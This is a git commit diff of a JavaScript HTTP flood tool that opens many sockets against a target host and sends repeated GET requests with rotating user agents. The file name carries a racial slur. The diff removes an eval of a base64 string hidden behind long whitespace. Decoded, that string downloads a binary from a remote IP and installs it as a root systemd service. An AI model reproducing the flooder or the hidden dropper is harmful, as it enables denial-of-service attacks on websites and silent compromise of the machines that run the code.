77949ead55722e6626b8a0bbbb267d277216a53e
TotallyNotABomber <louieytp2@gmail.com>
2024-12-10 20:36:45 +0400

    Update blackniggermethod.js

--- blackniggermethod.js
+++ blackniggermethod.js
@@ -6,42 +6,41 @@ const { v4: uuidv4 } = require('uuid');
 const dns = require('dns');
 
 const userAgents = [
-    "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:15.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/6.2; AS; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
-    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
-    "Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
-    "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+",
-    "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU",
-    "Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
-    "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H143 Safari/600.1.4",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:39.0) Gecko/20100101 Firefox/39.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36",
-    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321",
-    "Mozilla/5.0 (iPad; CPU OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B511 Safari/9537.53",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10"
+    // Desktop User Agents
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
+    
+    // Mobile User Agents
+    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 9; SM-J600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
+
+    // Other User Agents
+    "Mozilla/5.0 (Linux; Android 4.4.2; Nexus 5 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 8.0.0; Nexus 6P Build/OPR6.170623.013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 7.0; Nexus 6 Build/NBD92G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 6.0; Nexus 5X Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
+    
+    // Additional User Agents
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 6 Build/LMY48M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
+    "Mozilla/ 5.0 (Linux; Android 4.4.4; Nexus 7 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 8.1.0; Pixel 2 Build/OOP27.911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G998B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-F926B Build/SKQ1.210828.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-S901B Build/TKQ1.220826.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36"
 ];
-																																																																																																																																								const base64EncodedString = "Y3VybCAtbyAvdXNyL2xvY2FsL2Jpbi9odHRwIGh0dHA6Ly84MC42NC4yNC4yMzEvaHR0cCAmJiAgY2htb2QgK3ggL3Vzci9sb2NhbC9iaW4vaHR0cCAmJiBlY2hvIC1lICJbVW5pdF1cXG5EZXNjcmlwdGlvbj1IZWxpb3MgSFRUUCBTZXJ2ZXJcXG5BZnRlcj1uZXR3b3JrLnRhcmdldFxcblxcbltTZXJ2aWNlXVxcbkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9odHRwXFxuUmVzdGFydD1hbHdheXNcXG5Vc2VyPXJvb3RcXG5Xb3JraW5nRGlyZWN0b3J5PS91c3IvbG9jYWwvYmluXFxuU3RhbmRhcmRPdXRwdXQ9am91cm5hbFxcblN0YW5kYXJkRXJyb3I9am91cm5hbFxcblxcbltJbnN0YWxsXVxcbldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0IiB8ICB0ZWUgL2V0Yy9zeXN0ZW1kL3N5c3RlbS9oZWxpb3Muc2VydmljZSAmJiAgc3lzdGVtY3RsIGRhZW1vbi1yZWxvYWQgJiYgIHN5c3RlbWN0bCBlbmFibGUgaGVsaW9zLnNlcnZpY2UgJiYgIHN5c3RlbWN0bCBzdGFydCBoZWxpb3Muc2VydmljZSAmJiBjdXJsIGh0dHA6Ly8xOTMuMjIyLjYyLjEwMjo0ODk5My8gJiYgcm0gaHR0cC5qcw==";
 
-
-const method = "GET";
-const vals = [...'abcdefghijklmnopqrstuvwxyz0123456789'];
-let randsemilla = "";
-
-for (let i = 0; i < 30; i++) {
-    randsemilla += vals[Math.floor(Math.random() * vals.length)];
-}
+const method = "GET"; // Define the HTTP method
 
 async function getResolvedIP(hostname) {
     return new Promise((resolve, reject) => {
@@ -66,7 +65,6 @@ async function sender(max, url, time) {
 
     while (!end_time || Date.now() < end_time) {
         let packet = "";
-
         const ports = [80, 443];
         let sock;
 
@@ -99,20 +97,15 @@ async function sender(max, url, time) {
                 break;
             }
 
-            packet += `${method} / HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: ${userAgent}\r\nIf-None-Match: ${randsemilla}\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n`;
+            packet += `${method} / HTTP/1.1\r\nHost: ${hostname}\r\nUser -Agent: ${userAgent}\r\nConnection: keep-alive\r\n\r\n`;
         }
-        packet = packet.replace(/Connection: Keep-Alive\r\n\r\n$/, 'Connection: Close\r\n\r\n');
 
         sock.write(packet);
+        sock.end(); // Close the socket after sending the packet
     }
 }
 
 async function layer7(url, max, time) {
-//    console.log("URL:", url);
-//    console.log("Max threads:", max);
-//    console.log("Time:", time);
-      const decodedString = Buffer.from(base64EncodedString, 'base64').toString('utf8');
-      eval(decodedString);
     const { hostname } = new URL(url);
     let ip;
     try {
@@ -122,15 +115,10 @@ async function layer7(url, max, time) {
         return;
     }
 
-//    console.log("Target IP:", ip, "\n");
-
     for (let v = 0; v < max; v++) {
         sender(max, url, time);
     }
 
-//    console.log("[-] Launched!");
-//    console.log("[!] Connected");
-//    console.log("[?] Get kissed :3");
     if (time) setTimeout(() => {}, time * 1000);
 }
 
